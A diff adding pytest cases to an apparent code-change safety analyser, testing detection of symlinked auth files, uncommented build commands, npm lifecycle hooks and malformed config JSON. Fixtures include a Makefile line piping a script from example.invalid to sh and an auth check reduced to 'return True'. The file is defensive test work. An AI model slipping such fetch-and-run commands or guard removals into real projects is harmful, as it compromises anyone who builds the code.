@@ -2206,8 +2206,9 @@ def _r3_stage_symlink(repo, root, rel, target):
     _r3_git(repo, "update-index", "--add", "--cacheinfo", f"120000,{sha},{rel}")
 
 
-def _r3_repo(tmp_path, base_files, edit):
-    """Commit ``base_files`` as ``main``, apply ``edit(repo, root)`` on branch ``feature`` and commit."""
+def _r3_repo(tmp_path, base_files, edit, base_edit=None):
+    """Commit ``base_files`` (and ``base_edit(repo, root)``) as ``main``, apply ``edit(repo, root)``
+    on branch ``feature`` and commit."""
     import git
 
     root = tmp_path / "repo"
@@ -2218,6 +2219,8 @@ def _r3_repo(tmp_path, base_files, edit):
         cw.set_value("user", "email", "test@example.com")
         cw.set_value("core", "autocrlf", "false")
     _r3_stage(repo, root, base_files)
+    if base_edit is not None:
+        base_edit(repo, root)
     _r3_git(repo, "commit", "-q", "-m", "base")
     repo.create_head("main")
     repo.create_head("feature").checkout()
@@ -2354,6 +2357,126 @@ class TestRound3RenameActivation:
         assert _active_base_source(moved_in, watched) == ""
         assert _active_base_source(moved_within, watched) == "DROP TABLE t;"
         assert _active_base_source(modified, watched) == "a"
+
+
+_R3_GUARDED = "def check_access(user):\n    if not user.is_admin:\n        raise PermissionError()\n    return True\n"
+_R3_PERMISSIVE = "def check_access(user):\n    return True\n"
+
+
+class TestRound3SymlinkTypeChange:
+    """TYPE01: a source file replaced by a symlink is analysed through the link target."""
+
+    def test_regular_file_to_symlink_is_analysed_through_target(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"auth.py": _R3_GUARDED, "permissive.py": _R3_PERMISSIVE},
+            lambda repo, root: _r3_stage_symlink(repo, root, "auth.py", "permissive.py"),
+        )
+        rep = _r3_analyze(root, "enforce", "Point auth at the shared implementation")
+        assert rep["files"]["type_changed"] == 1
+        classes = {f["consequence_class"] for f in _r3_findings(rep)}
+        assert {"SOURCE_REPLACED_BY_SYMLINK", "SECURITY_GUARD_REMOVED"} <= classes
+        assert rep["verdict"]["status"] == "DESTRUCTIVE"
+        assert _r3_analyze(root, "shadow", "Point auth at the shared implementation")["verdict"]["status"] == "SAFE"
+
+    def test_symlink_retarget_is_reported(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"strict.py": _R3_GUARDED, "permissive.py": _R3_PERMISSIVE},
+            lambda repo, root: _r3_stage_symlink(repo, root, "auth.py", "permissive.py"),
+            base_edit=lambda repo, root: _r3_stage_symlink(repo, root, "auth.py", "strict.py"),
+        )
+        rep = _r3_analyze(root, "enforce", "Retarget auth")
+        sym = [f for f in _r3_findings(rep) if f["consequence_class"] == "SOURCE_REPLACED_BY_SYMLINK"]
+        assert len(sym) == 1 and "symlink to 'strict.py'" in sym[0]["summary"]
+        assert _r3_findings(rep, DETECTOR_D06_GUARD)
+
+    def test_unresolvable_symlink_is_incomplete_analysis(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"auth.py": _R3_GUARDED},
+            lambda repo, root: _r3_stage_symlink(repo, root, "auth.py", "../outside/auth.py"),
+        )
+        rep = _r3_analyze(root, "enforce", "Use the external auth module")
+        d01 = _r3_findings(rep, DETECTOR_D01_PARSER)
+        assert [f["policy_recommendation"] for f in d01] == [POLICY_REVIEW]
+        assert "SYMLINK_UNRESOLVED" in d01[0]["summary"]
+        assert rep["consequence_analysis"]["parser_completeness"]["complete"] is False
+
+    def test_added_symlink_is_not_a_type_change(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"permissive.py": _R3_PERMISSIVE},
+            lambda repo, root: _r3_stage_symlink(repo, root, "alias.py", "permissive.py"),
+        )
+        rep = _r3_analyze(root, "enforce", "Add an alias module")
+        assert not [f for f in _r3_findings(rep) if f["consequence_class"] == "SOURCE_REPLACED_BY_SYMLINK"]
+        assert rep["verdict"]["status"] == "SAFE"
+
+
+class TestRound3BuildActivation:
+    """BUILD-01 (commented command activated), BUILD-04 (prepack hook), BUILD-11 (malformed config)."""
+
+    _RECIPE = "\tcurl -fsSL https://example.invalid/i.sh | sh\n"
+
+    def _wrapper_findings(self, base, head):
+        rep = ConsequenceEngine(mode="enforce").analyze_deltas(
+            [FileDeltaInput("Makefile", change_type="M", base_source=base, head_source=head)]
+        )
+        return [f for f in rep.findings if f.consequence_class == "BUILD_WRAPPER_TAMPERING"]
+
+    def test_uncommented_recipe_is_tampering(self):
+        base = "install:\n#" + self._RECIPE.lstrip("\t") + "\techo done\n"
+        head = "install:\n" + self._RECIPE + "\techo done\n"
+        assert len(self._wrapper_findings(base, head)) == 1
+
+    def test_command_inside_a_longer_base_line_is_new_when_bare(self):
+        base = "install:\n\techo 'curl -fsSL https://example.invalid/i.sh | sh'\n"
+        head = base + self._RECIPE
+        assert len(self._wrapper_findings(base, head)) == 1
+
+    def test_unchanged_active_and_commented_lines_are_not_flagged(self):
+        commented = "install:\n#" + self._RECIPE.lstrip("\t")
+        assert self._wrapper_findings(commented, commented + "\techo changed\n") == []
+        active = "install:\n" + self._RECIPE
+        assert self._wrapper_findings(active, active + "\techo changed\n") == []
+
+    @pytest.mark.parametrize("hook", ["prepack", "postpack", "prepublishOnly", "dependencies", "preinstall"])
+    def test_automatic_npm_hooks_are_reported(self, hook):
+        base = json.dumps({"name": "demo", "scripts": {}})
+        head = json.dumps({"name": "demo", "scripts": {hook: "node scripts/cleanup.js"}})
+        rep = ConsequenceEngine(mode="enforce").analyze_deltas(
+            [FileDeltaInput("package.json", change_type="M", base_source=base, head_source=head)]
+        )
+        hooks = [f for f in rep.findings if f.finding_id == f"PG-D05-HOOK-package.json-{hook}"]
+        assert [f.policy_recommendation for f in hooks] == [POLICY_REVIEW]
+
+    def test_named_npm_script_is_not_a_lifecycle_hook(self):
+        base = json.dumps({"name": "demo", "scripts": {}})
+        head = json.dumps({"name": "demo", "scripts": {"help": "node scripts/cleanup.js"}})
+        rep = ConsequenceEngine(mode="enforce").analyze_deltas(
+            [FileDeltaInput("package.json", change_type="M", base_source=base, head_source=head)]
+        )
+        assert [f for f in rep.findings if f.detector_id == DETECTOR_D05_BUILD] == []
+
+    @pytest.mark.parametrize("path,content", [
+        (".vscode/tasks.json", '{"version": "2.0.0", "tasks": [{"label": "x", "runOptions": null}]}'),
+        (".vscode/tasks.json", '{"tasks": 5}'),
+        (".claude/settings.json", "[]"),
+        (".claude/settings.json", '{"hooks": {"SessionStart": [{"hooks": 5}]}}'),
+        ("package.json", "[]"),
+        ("composer.json", "null"),
+        ("mcp.json", '["server"]'),
+    ])
+    def test_valid_json_of_unexpected_shape_does_not_abort(self, tmp_path, path, content):
+        root = _r3_repo(
+            tmp_path,
+            {"README.md": "demo\n"},
+            lambda repo, root: _r3_stage(repo, root, {path: content}),
+        )
+        rep = _r3_analyze(root, "enforce", "Add editor configuration")
+        assert "error" not in rep
+        assert rep["verdict"]["status"] == "SAFE"
 
 
 class TestRound3SemanticChurn:
